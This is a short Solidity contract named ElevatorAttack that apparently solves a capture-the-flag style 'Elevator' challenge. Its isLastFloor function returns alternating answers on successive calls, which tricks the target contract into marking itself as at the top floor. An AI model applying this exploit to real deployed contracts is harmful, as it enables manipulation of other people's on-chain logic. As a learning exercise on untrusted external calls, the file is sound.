// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Elevator, Building } from "./Elevator.sol";

contract ElevatorAttack is Building {
    bool public lastFloorToggle;

    constructor() {lastFloorToggle = true;}
    function isLastFloor(uint256) external returns (bool) {
        lastFloorToggle = !lastFloorToggle;
        return lastFloorToggle;
    }

    function attackElevator(address elevatorInstance) external {
        Elevator(elevatorInstance).goTo(69);
    }
}
